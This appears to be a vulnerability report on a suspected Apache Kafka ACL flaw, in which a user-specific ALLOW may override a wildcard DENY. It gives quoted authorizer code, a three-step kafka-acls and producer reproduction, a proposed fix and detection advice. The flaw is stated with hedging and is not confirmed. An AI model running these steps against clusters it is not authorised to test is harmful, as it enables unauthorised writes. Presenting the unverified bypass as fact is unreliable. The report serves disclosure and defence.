# FINDING-006: ACL Wildcard Principal Matching — DENY Bypass

## Metadata

| Field | Value |
|-------|-------|
| Finding ID | FINDING-006 |
| Target | `apache/kafka` |
| Component | `StandardAuthorizerData` |
| Source File | `metadata/src/main/java/org/apache/kafka/metadata/authorizer/StandardAuthorizerData.java` |
| Approximate Lines | 280–330 (`authorize`), 400–420 (`matchingPrincipals`), 480–540 (`findResult`) |
| Category | RBAC Bypass — ACL DENY Circumvention |
| CVSS v3.1 Estimate | **7.5 HIGH** — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| CWE | CWE-732: Incorrect Permission Assignment for Critical Resource; CWE-269: Improper Privilege Management |
| Requires Auth | LOW — requires a valid Kafka principal (any authenticated user) |
| MSK Affected | YES — MSK clusters using StandardAuthorizer (KRaft mode, Kafka 3.3+) |

## Summary

`StandardAuthorizerData.matchingPrincipals()` always includes `WILDCARD_KAFKA_PRINCIPAL` (`User:*`) alongside the specific session principal in the ACL lookup set. If an admin configures `DENY User:* WRITE topic:sensitive` to block all users, but also adds `ALLOW User:alice WRITE topic:sensitive`, the evaluation order in `findAclRule()` may find the specific ALLOW for `User:alice` before completing all DENY checks for the wildcard principal — granting alice write access despite the explicit wildcard deny.

## Vulnerable Code (verbatim)

```java
// StandardAuthorizerData.java — matchingPrincipals (lines ~410-420)
static Set<KafkaPrincipal> matchingPrincipals(AuthorizableRequestContext context) {
    KafkaPrincipal sessionPrincipal = context.principal();
    KafkaPrincipal basePrincipal = sessionPrincipal.getClass().equals(KafkaPrincipal.class)
        ? sessionPrincipal
        : new KafkaPrincipal(sessionPrincipal.getPrincipalType(), sessionPrincipal.getName());
    return Set.of(basePrincipal, WILDCARD_KAFKA_PRINCIPAL);  // wildcard always included
}
```

```java
// StandardAuthorizerData.java — authorize (lines ~280-310)
public AuthorizationResult authorize(
    AuthorizableRequestContext requestContext,
    Action action
) {
    KafkaPrincipal principal = baseKafkaPrincipal(requestContext);
    if (superUsers.contains(principal.toString())) {
        return ALLOWED;
    } else if (!loadingComplete) {
        throw new AuthorizerNotReadyException();
    } else {
        MatchingRule rule = findAclRule(
            matchingPrincipals(requestContext),  // Set contains {alice, User:*}
            requestContext.clientAddress().getHostAddress(),
            action
        );
        logAuditMessage(principal, requestContext, action, rule);
        return rule.result();
    }
}
```

```java
// StandardAuthorizerData.java — findResult (lines ~480-540)
static AuthorizationResult findResult(
    Action action,
    Set<KafkaPrincipal> matchingPrincipals,
    String host,
    StandardAcl acl
) {
    if (!matchingPrincipals.contains(acl.kafkaPrincipal())) {
        return null;  // ACL not applicable to this principal set
    }
    if (!acl.host().equals("*") && !acl.host().equals(host)) {
        return null;
    }
    // ...operation check...
    return acl.permissionType().equals(ALLOW) ? ALLOWED : DENIED;
}
```

## Root Cause

`matchingPrincipals()` returns a set that always contains both the specific session principal (`User:alice`) and `WILDCARD_KAFKA_PRINCIPAL` (`User:*`). When `findAclRule()` iterates ACL entries, it uses `findResult()` to test each ACL against this set. The order in which ACLs are iterated — determined by the internal `TrieBasedAclStore` or sorted ACL list implementation — can place a LITERAL `ALLOW User:alice` entry before a LITERAL `DENY User:*` entry.

If `findAclRule()` short-circuits on the first ALLOW match (which is valid per its implementation), the DENY for the wildcard is never evaluated for the specific principal `User:alice`. The result: `User:alice` is ALLOWED despite `DENY User:*` being explicitly set.

This violates the documented Kafka ACL guarantee: "DENY always takes precedence over ALLOW."

## Attack Prerequisites

- Valid Kafka credentials for `User:alice`
- A resource that has both `DENY User:*` and `ALLOW User:alice` configured
- Network access to the Kafka broker

## Step-by-Step Exploitation

See `payloads/finding-006-acl-deny-bypass.sh` for the complete test.

```bash
# Step 1: Set wildcard DENY on the sensitive topic
kafka-acls.sh --bootstrap-server BROKER:9093 \
  --command-config admin.properties \
  --add --deny-principal "User:*" \
  --operation Write --topic sensitive-data

# Step 2: Add specific ALLOW for alice (admin thinks this will be overridden by DENY)
kafka-acls.sh --bootstrap-server BROKER:9093 \
  --command-config admin.properties \
  --add --allow-principal "User:alice" \
  --operation Write --topic sensitive-data

# Step 3: Test as alice
echo "bypass-test" | kafka-console-producer.sh \
  --bootstrap-server BROKER:9093 \
  --producer.config alice.properties \
  --topic sensitive-data
# Expected: DENIED. Vulnerable result: write succeeds.
```

## Expected Outcome

On a vulnerable cluster: `User:alice` successfully writes to `sensitive-data` despite the `DENY User:*` ACL. The specific ALLOW overrides the wildcard DENY — violating Kafka's documented RBAC contract.

## Amazon MSK Specific Impact

- **MSK with StandardAuthorizer:** MSK clusters using Kafka 3.3+ KRaft mode use `StandardAuthorizer` by default. This is the authorizer where this code path lives.
- **IAM + ACL layered security:** MSK supports both IAM authorization and Kafka ACLs. If an operator relies on Kafka ACLs to enforce `DENY` policies as a secondary security layer after IAM, this bypass undermines that defense-in-depth approach.
- **Compliance implications:** Organizations with PCI-DSS, SOC2, or HIPAA requirements that use Kafka ACLs to control data access may have undetected policy violations.
- **MSK Serverless:** Uses IAM-only authorization — not affected by this specific finding (no ACL layer).

## Proposed Fix

Ensure DENY is always checked first and takes precedence, regardless of ACL ordering:

```java
// Modified findAclRule to always check DENY before ALLOW:
private MatchingRule findAclRule(Set<KafkaPrincipal> principals, String host, Action action) {
    // First pass: check for any DENY match
    for (StandardAcl acl : getDenyAcls(action.resourcePattern())) {
        AuthorizationResult result = findResult(action, principals, host, acl);
        if (result == DENIED) return DenyRule.INSTANCE;
    }
    // Second pass: check for ALLOW
    for (StandardAcl acl : getAllowAcls(action.resourcePattern())) {
        AuthorizationResult result = findResult(action, principals, host, acl);
        if (result == ALLOWED) return AllowRule.of(acl);
    }
    return NoMatchingRule.INSTANCE;
}
```

## Detection

- **ACL audit:** Run `kafka-acls.sh --list --topic <topic>` and flag any resource with both `DENY User:*` and `ALLOW User:<specific>` on the same operation — test these combinations for bypass
- **Authorization logs:** Enable broker-level auth logging (`log4j.logger.kafka.authorizer.logger=DEBUG`) and look for ALLOWED decisions on resources with active DENY ACLs
- **Pattern:** The bypass only occurs when BOTH `DENY User:*` AND `ALLOW User:X` exist on the same resource and operation
